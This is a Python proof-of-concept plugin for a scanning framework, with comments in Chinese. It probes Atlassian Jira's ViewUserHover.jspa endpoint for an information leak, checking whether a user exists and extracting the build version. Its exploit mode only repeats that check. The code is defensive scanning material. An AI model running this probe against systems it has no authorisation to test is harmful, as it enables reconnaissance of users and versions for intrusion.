from BasePoc import BasePoc
from urllib.parse import urljoin
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from utils import tree, highlight,req

POC_NAME = "AtlassianJira"
# PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同

class AtlassianJira(BasePoc):
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0034',    # PoC的VID编号
            'vbid': '',
            'Name': 'Atlassian Jira',    # PoC名称
            'Author': 'xuanzhu.wei',    # PoC作者
            'Create_date': '2021-08-02',    # PoC创建时间
            },

        'vul': {
            'Product': 'Atlassian Jira',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'Information disclosure',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Atlassian Jira 信息泄露
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-08-02',    # PoC公布时间
        }
    }
    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
            'Target': '',    # 目标网站域名
            'Mode': 'verify',    # verify或exploit
            'Verbose': True,    # 是否打印详细信息
            'Error': '',    # 检测失败时可用于记录相关信息
            'Success': False,    # 是否检出漏洞，若检出请更新该值为True
            'risk_category': 'sec_vul',
            'Ret': tree()    # 可用于记录额外的一些信息
        }

    test_case = {
            'Need_fb': False,
            'Vuln': [],    # 列表格式的测试URL
            'Not_vuln': [],    # 同上
        }

    def verify(self,first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")        # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息


        # 以下是PoC的检测逻辑
        
        url = urljoin(target,'/secure/ViewUserHover.jspa?username=admin')
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            #resp = req(url, 'post', data=data, headers=headers, allow_redirects=False)
            #response = requests.get(url=url, headers=headers, verify=False, timeout=5)
            resp = req(url,'get',headers=headers)
            version = re.findall(r'<span id="footer-build-information">\((.*?)#', resp.text)[0]
            if "admin" in resp.text:
                print("[+] 目标 Jira 版本为{} ".format(version))
                print("[+] 目标{}存在漏洞 ".format(target))
            else:
                print("[+] 目标不存在漏洞")
                sys.exit(0)
        except Exception as e:
            print(e)

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
